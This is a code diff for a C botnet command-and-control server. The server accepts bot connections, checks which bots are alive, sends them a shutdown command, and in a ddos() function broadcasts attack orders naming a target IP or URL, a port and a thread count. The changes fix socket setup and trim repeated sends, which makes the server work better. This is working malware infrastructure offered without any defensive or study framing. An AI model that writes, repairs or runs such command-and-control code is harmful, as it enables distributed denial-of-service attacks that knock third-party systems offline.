@@ -9,6 +9,7 @@ pthread_t accept_thread;
 int main_sock;
 struct sockaddr_in serverAddr;
 char STOPFLAG = 0;
+short port = 15551;
 
 void start()
 {
@@ -41,8 +42,9 @@ void start()
 void init()
 {
 	main_sock = make_socket();
-	bind_socket(main_sock, 15551, &serverAddr);
-	pthread_create(&accept_thread, NULL, accept_handler, NULL);
+	bind_socket(&serverAddr);
+	listen(main_sock, 8);
+	pthread_create(&accept_thread, NULL, (void *) accept_handler, NULL);
 	
 }
 
@@ -51,9 +53,11 @@ void close_all()
 	// Stop Receiving Connections by connecting to the other thread.
 	STOPFLAG = 1;
 	pthread_join(accept_thread, NULL);
+	printf("[+] Accepting Closed\n");
 	struct connections *connects = &cons;
 	send_to_bots("[!SHUTDOWN!]");
-	while(connects != NULL){
+	while(connects != NULL && connects->sock != 0){
+
 		// here sould have a protocol that will close the connection for a bot and cause it to stop running. 
 		close(connects->sock);
 		printf("[i] Connection Closed From : %s\n", inet_ntoa(connects->client_conn.sin_addr));
@@ -138,8 +142,6 @@ void ddos()
 			sprintf(to_send, "%s http://%s %s", type, target_ip, max_threads);
 			printf("Current Options:\n\t%s\n", to_send);
 			send_to_bots(to_send);
-			send_to_bots(to_send);
-			send_to_bots(to_send);
 			while(1){
 
 			}
@@ -164,8 +166,6 @@ void ddos()
 			
 			sprintf(to_send, "%s %s %s %s", type, target_ip, max_threads, port);
 			printf("%s\n", to_send);
-			send_to_bots(to_send);
-			send_to_bots(to_send);
 			send_to_bots(to_send);
 			while(1){
 
@@ -205,8 +205,6 @@ void ddos()
 			sprintf(all_to_send, "%s %s http://%s %s %s", type, target_ip, target_url, port, max_threads);
 			printf("%s\n", all_to_send);
 			send_to_bots(all_to_send);
-			send_to_bots(all_to_send);
-			send_to_bots(all_to_send);
 			while(1){
 
 			}
@@ -226,20 +224,17 @@ void ls_all_bots()
 {
 	struct connections *connects = &cons;
 	int i = 0;
-	char temp[8];
-	int temp_size;
 	printf("\n");
+	while(connects != NULL && connects->sock != 0){
 
-	while(connects != NULL){
-
-		if(sendto(connects->sock, "UP?", 3, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr)) == -1) {
+		char temp[8];
+		printf("%d\n", connects->sock);
+		if(write(connects->sock, "UP?", 3) == -1) {
 			connects = connects->next;
 			continue;
 		}
 		
-		temp_size = sizeof(struct sockaddr);
-
-		recvfrom(connects->sock, temp, 8, 0, (struct sockaddr *)&connects->client_conn, &temp_size);
+		read(connects->sock, temp, 8);
 		
 		if(strncmp(temp, "?YES!", 5) == 0) {
 			printf("# %d Connection From => %s\n", i, inet_ntoa(connects->client_conn.sin_addr));
@@ -284,7 +279,7 @@ int main(int argc, char const *argv[])
 
 	start();
 
-	close(main_sock);
+	//close(main_sock);
 
 	return 0;
 }
